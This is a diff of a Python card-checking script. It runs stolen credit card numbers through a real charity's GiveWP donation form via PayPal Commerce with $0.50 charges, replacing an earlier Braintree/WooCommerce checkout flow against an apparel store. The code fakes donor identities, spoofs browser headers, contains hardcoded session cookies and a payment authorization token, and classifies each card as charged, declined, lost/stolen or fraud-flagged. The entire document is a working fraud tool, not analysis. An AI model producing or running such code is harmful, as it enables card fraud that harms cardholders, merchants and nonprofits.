-        au = 'eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NzkzNzMxMDIsImp0aSI6IjJkNDc0ZGI5LWViYzYtNDdkZi05MTM3LWE0Nzk0Y2VkNjJjMyIsInN1YiI6InF6bjdiNTl6enJxN2duMzkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InF6bjdiNTl6enJxN2duMzkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIiwiQnJhaW50cmVlOkFYTyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJyZWxlbnRsZXNzZGVmZW5kZXJhcHBhcmVsX2luc3RhbnQiLCJwYXlwYWxfY2xpZW50X2lkIjoiQVJEUThtcmJ6ekhwcFFKU1J6N21uUHFscEFDTDBYeE9wU0YtSFJjV095bTBDZzNPTHVSd3piZzJQOUJvckpoZDdMeExqS0tNWnFGdndWUU8ifX0.24lkRgjz-bF7fm3w_Xr3woBtVLxXYgVatxdUaGZ2NQVM2foYXnSrJ7RyRmu2fquCsrO5Eb5zM5xVg8jEXepZjA'
-        print("[6/6] Using fallback authorization fingerprint")
+        return None
+        
+    return {
+        'fp': fp.group(1), 
+        'fi': fi.group(1), 
+        'nc': nc.group(1),
+        'at': au.group(1), 
+        'session': s
+    }
+
+def generate_fake_data():
+    first, last = generate_random_name()
+    email = generate_random_email()
+    return {"first_name": first, "last_name": last, "full_name": f"{first} {last}", "email": email, "card_name": f"{first} {last}"}
+
+def pay(ccx):
+    ccx = ccx.strip()
+    parts = ccx.split('|')
+    if len(parts) < 4: 
+        return 'INVALID_FORMAT'
     
-    headers_token = {
-        'authority': 'payments.braintree-api.com',
+    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
+    if len(yy) == 2: 
+        yy = '20' + yy
+    
+    fake = generate_fake_data()
+    d = extract_data()
+    
+    if not d: 
+        return 'EXTRACT_FAILED | Could not get form data from site'
+    
+    s = d['session']
+    fp, fi, nc, at = d['fp'], d['fi'], d['nc'], d['at']
+    
+    ua = get_random_user_agent()
+    
+    headers = {
+        'origin': SITE_URL, 
+        'referer': SITE_URL,
+        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile': '?1', 
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty', 
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': ua, 
+        'x-requested-with': 'XMLHttpRequest',
+    }
+    
+    data = {
+        'give-honeypot': '', 
+        'give-form-id-prefix': fp, 
+        'give-form-id': fi,
+        'give-form-title': '', 
+        'give-current-url': SITE_URL,
+        'give-form-url': SITE_URL, 
+        'give-form-minimum': '0.50',
+        'give-form-maximum': '999999.99', 
+        'give-form-hash': nc,
+        'give-price-id': '3', 
+        'give-recurring-logged-in-only': '',
+        'give-logged-in-only': '1', 
+        '_give_is_donation_recurring': '0',
+        'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
+        'give-amount': '0.50',
+        'give_stripe_payment_method': '',
+        'payment-mode': 'paypal-commerce', 
+        'give_first': fake['first_name'],
+        'give_last': fake['last_name'], 
+        'give_email': fake['email'],
+        'card_name': fake['card_name'], 
+        'card_exp_month': '', 
+        'card_exp_year': '',
+        'give_action': 'purchase', 
+        'give-gateway': 'paypal-commerce',
+        'action': 'give_process_donation', 
+        'give_ajax': 'true',
+    }
+    
+    s.post(URL_AJAX, headers=headers, data=data, timeout=30)
+    
+    mp = MultipartEncoder(fields={
+        'give-honeypot': (None, ''), 
+        'give-form-id-prefix': (None, fp),
+        'give-form-id': (None, fi), 
+        'give-form-title': (None, ''),
+        'give-current-url': (None, SITE_URL), 
+        'give-form-url': (None, SITE_URL),
+        'give-form-minimum': (None, '0.50'), 
+        'give-form-maximum': (None, '999999.99'),
+        'give-form-hash': (None, nc), 
+        'give-price-id': (None, '3'),
+        'give-recurring-logged-in-only': (None, ''), 
+        'give-logged-in-only': (None, '1'),
+        '_give_is_donation_recurring': (None, '0'),
+        'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
+        'give-amount': (None, '0.50'),
+        'give_stripe_payment_method': (None, ''),
+        'payment-mode': (None, 'paypal-commerce'), 
+        'give_first': (None, fake['first_name']),
+        'give_last': (None, fake['last_name']), 
+        'give_email': (None, fake['email']),
+        'card_name': (None, fake['card_name']), 
+        'card_exp_month': (None, ''),
+        'card_exp_year': (None, ''), 
+        'give-gateway': (None, 'paypal-commerce'),
+    })
+    headers['content-type'] = mp.content_type
+    
+    r1 = s.post(f'{URL_AJAX}?action=give_paypal_commerce_create_order', headers=headers, data=mp, timeout=30)
+    try:
+        tok = r1.json()['data']['id']
+    except:
+        return f'ORDER_ERROR: {r1.text[:150]}'
+    
+    pp_headers = {
+        'authority': 'cors.api.paypal.com', 
         'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9',
-        'authorization': f'Bearer {au}',
-        'braintree-version': '2018-05-10',
+        'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
+        'authorization': f'Bearer {at}',
+        'braintree-sdk-version': '3.32.0-payments-sdk-dev',
         'content-type': 'application/json',
         'origin': 'https://assets.braintreegateway.com',
         'referer': 'https://assets.braintreegateway.com/',
-        'user-agent': user,
+        'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-mobile': '?1', 
         'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty', 
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'cross-site', 
+        'user-agent': ua,
     }
     
-    token_data = {
-        'clientSdkMetadata': {
-            'source': 'client',
-            'integration': 'dropin2',
-            'sessionId': session_id,
+    json_data = {
+        'payment_source': {
+            'card': {
+                'number': cc, 
+                'expiry': f'{yy}-{mm}', 
+                'security_code': cvv,
+                'attributes': {
+                    'verification': {
+                        'method': 'SCA_WHEN_REQUIRED'
+                    }
+                }
+            }
         },
-        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear } } }',
-        'variables': {
-            'input': {
-                'creditCard': {
-                    'number': n,
-                    'expirationMonth': mm,
-                    'expirationYear': yy,
-                    'cvv': cvc,
-                },
-                'options': {'validate': False},
-            },
+        'application_context': {
+            'vault': False
         },
-        'operationName': 'TokenizeCreditCard',
     }
     
-    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers_token, json=token_data)
-    print(f"[6/6] Tokenization status: {response.status_code}")
+    s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', 
+           headers=pp_headers, json=json_data, timeout=30)
     
-    try:
-        tok = response.json()['data']['tokenizeCreditCard']['token']
-        print(f"[6/6] Got token: {tok[:30]}...")
-    except Exception as e:
-        print(f"[6/6] Tokenization failed: {e}")
-        return f'TOKENIZATION_FAILED'
+    mp2 = MultipartEncoder(fields={
+        'give-honeypot': (None, ''), 
+        'give-form-id-prefix': (None, fp),
+        'give-form-id': (None, fi), 
+        'give-form-title': (None, ''),
+        'give-current-url': (None, SITE_URL), 
+        'give-form-url': (None, SITE_URL),
+        'give-form-minimum': (None, '0.50'), 
+        'give-form-maximum': (None, '999999.99'),
+        'give-form-hash': (None, nc), 
+        'give-price-id': (None, '3'),
+        'give-recurring-logged-in-only': (None, ''), 
+        'give-logged-in-only': (None, '1'),
+        '_give_is_donation_recurring': (None, '0'),
+        'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
+        'give-amount': (None, '0.50'),
+        'give_stripe_payment_method': (None, ''),
+        'payment-mode': (None, 'paypal-commerce'), 
+        'give_first': (None, fake['first_name']),
+        'give_last': (None, fake['last_name']), 
+        'give_email': (None, fake['email']),
+        'card_name': (None, fake['card_name']), 
+        'card_exp_month': (None, ''),
+        'card_exp_year': (None, ''), 
+        'give-gateway': (None, 'paypal-commerce'),
+    })
+    headers['content-type'] = mp2.content_type
     
-    # ================ 6. FINAL CHECKOUT ================
-    print("\n[7/7] Processing final checkout...")
+    r2 = s.post(f'{URL_AJAX}?action=give_paypal_commerce_approve_order&order=' + tok, headers=headers, data=mp2, timeout=30)
+    txt = r2.text
     
-    cookies_final = {
-        'apbct_site_landing_ts': '1779286498',
-        'apbct_site_referer': '0',
-        'ct_sfw_pass_key': CT_SFW_PASS_KEY,
-        '__cf_bm': 'q5zwDmlkt6Q.YBLzNGgGGYDJKFFqJDZHzdsRaA.aku8-1779286498-1.0.1.1-GR8gFGvWBNi_UrQJeBDvwgou8L5oQZXM7CpNnR_H_Z8vtAsbTGlvVHQtyzgB5YvCGHU0LD1zh6r0fMY6tXYJ7ovaqh8crTbDX1YO6_G0GAk',
-        'sbjs_migrations': '1418474375998%3D1',
-        'sbjs_current_add': 'fd%3D2026-05-20%2014%3A15%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29',
-        'sbjs_first_add': 'fd%3D2026-05-20%2014%3A15%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29',
-        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
-        'ct_checkjs': CT_CHECKJS,
-        'ct_timezone': '3',
-        'apbct_headless': 'false',
-        'unique_session_id': 'a745f2ff-01f7-4302-8743-8ae096272863',
-        'ct_mouse_moved': 'true',
-        'commercekit-nonce-value': '72c25b68de',
-        'commercekit-nonce-state': '0',
-        '_fbp': 'fb.1.1779286506441.457161318630096402',
-        'ct_has_scrolled': 'true',
-        'wp_woocommerce_session_458d4ca3bc4f7f1cca967894c172ad61': WOOCOMMERCE_SESSION,
-        'woocommerce_items_in_cart': '1',
-        'woocommerce_cart_hash': '4988a1d4aee2617224427e20002b2513',
-        'sbjs_session': 'pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fcheckout%2F',
-        'ct_pointer_data': '%5B%5B290%2C313%2C54129%5D%2C%5B208%2C308%2C65165%5D%2C%5B242%2C323%2C66211%5D%2C%5B322%2C38%2C69677%5D%2C%5B365%2C285%2C75650%5D%2C%5B442%2C273%2C92897%5D%2C%5B299%2C290%2C97829%5D%2C%5B138%2C306%2C99934%5D%2C%5B172%2C299%2C100373%5D%2C%5B186%2C285%2C125338%5D%5D',
-    }
-    
-    headers_final = {
-        'authority': 'relentlessdefender.com',
-        'accept': 'application/json, text/javascript, */*; q=0.01',
-        'accept-language': 'en-US,en;q=0.9',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'origin': 'https://relentlessdefender.com',
-        'referer': 'https://relentlessdefender.com/checkout/',
-        'user-agent': user,
-        'x-requested-with': 'XMLHttpRequest',
-        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-    }
-    
-    params_final = {'wc-ajax': 'checkout'}
-    
-    data_final = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Frelentlessdefender.com%2Fcart%2F&wc_order_attribution_session_start_time=2026-05-20+14%3A15%3A00&wc_order_attribution_session_pages=11&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&billing_first_name={fake_data["first_name"]}&billing_last_name={fake_data["last_name"]}&billing_company=&billing_country=US&billing_address_1={fake_data["address_1"].replace(" ", "+")}&billing_address_2=&billing_city={fake_data["city"]}&billing_state={fake_data["state"]}&billing_postcode={fake_data["postcode"]}&billing_phone={fake_data["phone"]}&billing_email={fake_data["email"]}&wc_apbct_email_id=&bb30e59=0&bb30e59=1&e038059=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=flat_rate%3A18&payment_method=braintree_cc&braintree_cc_nonce_key={tok}&braintree_cc_device_data=&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fqzn7b59zzrq7gn39%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fqzn7b59zzrq7gn39%22%7D%2C%22merchantId%22%3A%22qzn7b59zzrq7gn39%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22US%22%2C%22currencyCode%22%3A%22USD%22%2C%22merchantIdentifier%22%3A%22qzn7b59zzrq7gn39%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22fastlane%22%3A%7B%22enabled%22%3Atrue%2C%22tokensOnDemand%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22Visa%22%2C%22Discover%22%2C%22JCB%22%2C%22MasterCard%22%2C%22American+Express%22%2C%22UnionPay%22%5D%7D%2C%22threeDSecureEnabled%22%3Afalse%2C%22threeDSecure%22%3Anull%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Relentless+Defender+Apparel%22%2C%22clientId%22%3A%22ARDQ8mrbzzHppQJSRz7mnPqlpACL0XxOpSF-HRcWOym0Cg3OLuRwzbg2P9BorJhd7LxLjKKMZqFvwVQO%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22relentlessdefenderapparel_instant%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%7D&braintree_paypal_nonce_key=&braintree_paypal_device_data=&braintree_applepay_nonce_key=&braintree_applepay_device_data=&woocommerce-process-checkout-nonce={check_nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&apbct_visible_fields=eyIwIjp7InZpc2libGVfZmllbGRzIjoiYmlsbGluZ19maXJzdF9uYW1lIGJpbGxpbmdfbGFzdF9uYW1lIGJpbGxpbmdfY29tcGFueSBiaWxsaW5nX2NvdW50cnkgYmlsbGluZ19hZGRyZXNzXzEgYmlsbGluZ19hZGRyZXNzXzIgYmlsbGluZ19jaXR5IGJpbGxpbmdfc3RhdGUgYmlsbGluZ19wb3N0Y29kZSBiaWxsaW5nX3Bob25lIGJpbGxpbmdfZW1haWwgd2NfYXBiY3RfZW1haWxfaWQgc2hpcHBpbmdfZmlyc3RfbmFtZSBzaGlwcGluZ19sYXN0X25hbWUgc2hpcHBpbmdfY29tcGFueSBzaGlwcGluZ19jb3VudHJ5IHNoaXBwaW5nX2FkZHJlc3NfMSBzaGlwcGluZ19hZGRyZXNzXzIgc2hpcHBpbmdfY2l0eSBzaGlwcGluZ19zdGF0ZSBzaGlwcGluZ19wb3N0Y29kZSBvcmRlcl9jb21tZW50cyIsInZpc2libGVfZmllbGRzX2NvdW50IjoyMiwiaW52aXNpYmxlX2ZpZWxkcyI6IndjX29yZGVyX2F0dHJpYnV0aW9uX3NvdXJjZV90eXBlIHdjX29yZGVyX2F0dHJpYnV0aW9uX3JlZmVycmVyIHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV9jYW1wYWlnbiB3Y19vcmRlcl9hdHRyaWJ1dGlvbl91dG1fc291cmNlIHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV9tZWRpdW0gd2Nfb3JkZXJfYXR0cmlidXRpb25fdXRtX2NvbnRlbnQgd2Nfb3JkZXJfYXR0cmlidXRpb25fdXRtX2lkIHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV90ZXJtIHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV9zb3VyY2VfcGxhdGZvcm0gd2Nfb3JkZXJfYXR0cmlidXRpb25fdXRtX2NyZWF0aXZlX2Zvcm1hdCB3Y19vcmRlcl9hdHRyaWJ1dGlvbl91dG1fbWFya2V0aW5nX3RhY3RpYyB3Y19vcmRlcl9hdHRyaWJ1dGlvbl9zZXNzaW9uX2VudHJ5IHdjX29yZGVyX2F0dHJpYnV0aW9uX3Nlc3Npb25fc3RhcnRfdGltZSB3Y19vcmRlcl9hdHRyaWJ1dGlvbl9zZXNzaW9uX3BhZ2VzIHdjX29yZGVyX2F0dHJpYnV0aW9uX3Nlc3Npb25fY291bnQgd2Nfb3JkZXJfYXR0cmlidXRpb25fdXNlcl9hZ2VudCBiYjMwZTU5IGUwMzgwNTkgYnJhaW50cmVlX2NjX25vbmNlX2tleSBicmFpbnRyZWVfY2NfZGV2aWNlX2RhdGEgYnJhaW50cmVlX2NjXzNkc19ub25jZV9rZXkgYnJhaW50cmVlX2NjX2NvbmZpZ19kYXRhIGJyYWludHJlZV9wYXlwYWxfbm9uY2Vfa2V5IGJyYWludHJlZV9wYXlwYWxfZGV2aWNlX2RhdGEgYnJhaW50cmVlX2FwcGxlcGF5X25vbmNlX2tleSBicmFpbnRyZWVfYXBwbGVwYXlfZGV2aWNlX2RhdGEgd29vY29tbWVyY2UtcHJvY2Vzcy1jaGVja291dC1ub25jZSBfd3BfaHR0cF9yZWZlcmVyIiwiaW52aXNpYmxlX2ZpZWxkc19jb3VudCI6Mjh9fQ%3D%3D'
-    
-    response = r.post('https://relentlessdefender.com/', params=params_final, headers=headers_final, data=data_final, cookies=cookies_final)
-    print(f"[7/7] Final checkout status: {response.status_code}")
-    
-    # ================ 7. PARSE RESULT ================
-    print("\n[8/8] Parsing result...")
-    
-    try:
-        result_data = json.loads(response.text)
-        messages = result_data.get("messages", "")
-        full_response = response.text
-        print(f"[8/8] Response: {json.dumps(result_data, indent=2)[:500]}")
-    except:
-        print(f"[8/8] Raw response: {response.text[:500]}")
-        return 'PARSE_ERROR'
-    
-    clean_messages = clean_html(messages)
-    clean_full = clean_html(full_response)
-    search_text = clean_messages + " " + clean_full
-    
-    reason_match = re.search(r'reason:\s*([^\.]+)', search_text)
-    reason = reason_match.group(1).strip() if reason_match else None
-    
-    print(f"\n[DEBUG] Clean response: {search_text[:300]}")
-    
-    # ==================== ردود Braintree الكاملة ====================
-    
-    if 'charged' in search_text or 'success' in search_text or 'completed' in search_text or 'approved' in search_text:
-        return 'CHARGED'
-    
-    if 'insufficient funds' in search_text:
-        return 'INSUFFICIENT FUNDS'
-    
-    if 'cvv' in search_text or 'cvv2 failure' in search_text or 'cvv verification failed' in search_text:
-        return 'CVV MISMATCH'
-    
-    if 'expired card' in search_text:
-        return 'EXPIRED CARD'
-    
-    if 'do not honor' in search_text:
-        return 'DO NOT HONOR'
-    
-    if 'closed card' in search_text:
-        return 'CLOSED CARD'
-    
-    if 'call issuer' in search_text:
-        return 'CALL ISSUER'
-    
-    if 'pick up card' in search_text or 'pickup card' in search_text:
-        return 'PICK UP CARD'
-    
-    if '3d secure' in search_text or 'three_d_secure' in search_text:
-        return '3D SECURE REQUIRED'
-    
-    if 'limit exceeded' in search_text:
-        return 'LIMIT EXCEEDED'
-    
-    if 'lost or stolen' in search_text:
-        return 'LOST/STOLEN CARD'
-    
-    if 'address verification' in search_text or 'avs' in search_text:
-        return 'ADDRESS MISMATCH'
-    
-    if 'processor declined' in search_text:
-        return 'PROCESSOR DECLINED'
-    
-    if 'invalid card' in search_text:
-        return 'INVALID CARD'
-    
-    if 'no account' in search_text:
-        return 'NO ACCOUNT'
-    
-    if 'card not activated' in search_text:
-        return 'CARD NOT ACTIVATED'
-    
-    if 'cannot authorize at this time' in search_text:
-        return 'CANNOT AUTHORIZE (POLICY)'
-    
-    if 'card type is not accepted' in search_text:
-        return 'CARD TYPE NOT ACCEPTED'
-    
-    if 'restriction on the card' in search_text:
-        return 'CARD RESTRICTION'
-    
-    if 'cleantalk suspect' in search_text or 'cleantalk' in search_text:
-        if 'fraud' in search_text:
-            return 'CLEANTALK FRAUD SUSPECT'
-        else:
-            return 'CLEANTALK SUSPECT'
-    
-    if 'gateway rejected: fraud' in search_text:
-        return 'GATEWAY REJECTED FRAUD'
-    
-    if 'risk_threshold' in search_text:
-        return 'RISK THRESHOLD'
-    
-    if 'processor declined - fraud suspected' in search_text:
-        return 'PROCESSOR DECLINED - FRAUD SUSPECTED'
-    
-    if 'call issuer. pick up card' in search_text:
-        return 'CALL ISSUER - PICK UP CARD'
-    
-    if 'email does not exist' in search_text:
-        return 'EMAIL DOES NOT EXIST'
-    
-    if 'fraud' in search_text or 'suspected fraud' in search_text:
-        return 'SUSPECTED FRAUD'
-    
-    if 'order was detected as spam' in search_text or 'your order was detected as spam' in search_text:
-        return 'ORDER DETECTED AS SPAM'
-    
-    if 'declined' in search_text:
-        return 'DECLINED'
-    
-    if reason and len(reason) < 50:
-        return reason.upper()
-    
-    if clean_messages and len(clean_messages) < 100:
-        return clean_messages.title()
-    
-    return 'DECLINED'
+    # الردود زي ما هي من غير تعديل
+    if 'DO_NOT_HONOR' in txt: 
+        return 'Declined | Do not honor'
+    elif 'ACCOUNT_CLOSED' in txt: 
+        return 'Declined | Account closed'
+    elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in txt: 
+        return 'Declined | Account closed'
+    elif 'LOST_OR_STOLEN' in txt: 
+        return 'Declined | LOST OR STOLEN'
+    elif 'CVV2_FAILURE' in txt: 
+        return 'Declined | Card Issuer Declined CVV'
+    elif 'SUSPECTED_FRAUD' in txt: 
+        return 'Declined | SUSPECTED FRAUD'
+    elif 'INVALID_ACCOUNT' in txt: 
+        return 'Declined | INVALID_ACCOUNT'
+    elif 'REATTEMPT_NOT_PERMITTED' in txt: 
+        return 'Declined | REATTEMPT NOT PERMITTED'
+    elif 'ACCOUNT BLOCKED BY ISSUER' in txt: 
+        return 'Declined | ACCOUNT_BLOCKED_BY_ISSUER'
+    elif 'ORDER_NOT_APPROVED' in txt: 
+        return 'Declined | ORDER_NOT_APPROVED'
+    elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in txt: 
+        return 'Declined | PICKUP_CARD_SPECIAL_CONDITIONS'
+    elif 'PAYER_CANNOT_PAY' in txt: 
+        return 'Declined | PAYER CANNOT PAY'
+    elif 'INSUFFICIENT_FUNDS' in txt: 
+        return 'Declined | Insufficient Funds'
+    elif 'GENERIC_DECLINE' in txt: 
+        return 'Declined | GENERIC_DECLINE'
+    elif 'COMPLIANCE_VIOLATION' in txt: 
+        return 'Declined | COMPLIANCE VIOLATION'
+    elif 'TRANSACTION_NOT PERMITTED' in txt: 
+        return 'Declined | TRANSACTION NOT PERMITTED'
+    elif 'PAYMENT_DENIED' in txt: 
+        return 'Declined | PAYMENT_DENIED'
+    elif 'INVALID_TRANSACTION' in txt: 
+        return 'Declined | INVALID TRANSACTION'
+    elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in txt: 
+        return 'Declined | RESTRICTED OR INACTIVE ACCOUNT'
+    elif 'SECURITY_VIOLATION' in txt: 
+        return 'Declined | SECURITY_VIOLATION'
+    elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in txt: 
+        return 'Declined | DECLINED DUE TO UPDATED ACCOUNT'
+    elif 'INVALID_OR_RESTRICTED_CARD' in txt: 
+        return 'Declined | INVALID CARD'
+    elif 'EXPIRED_CARD' in txt: 
+        return 'Declined | EXPIRED CARD'
+    elif 'CRYPTOGRAPHIC_FAILURE' in txt: 
+        return 'Declined | CRYPTOGRAPHIC FAILURE'
+    elif 'TRANSACTION_CANNOT_BE_COMPLETED' in txt: 
+        return 'Declined | TRANSACTION CANNOT BE COMPLETED'
+    elif 'DECLINED_PLEASE_RETRY' in txt: 
+        return 'Declined | DECLINED PLEASE RETRY LATER'
+    elif 'TX_ATTEMPTS_EXCEED_LIMIT' in txt: 
+        return 'Declined | EXCEED LIMIT'
+    elif 'true' in txt or 'sucsess' in txt or 'COMPLETED' in txt:
+        return 'Charged !'
+    else:
+        try:
+            return f"Response | {json.loads(txt)['data']['error']}"
+        except:
+            return f'Response | {txt[:300]}'
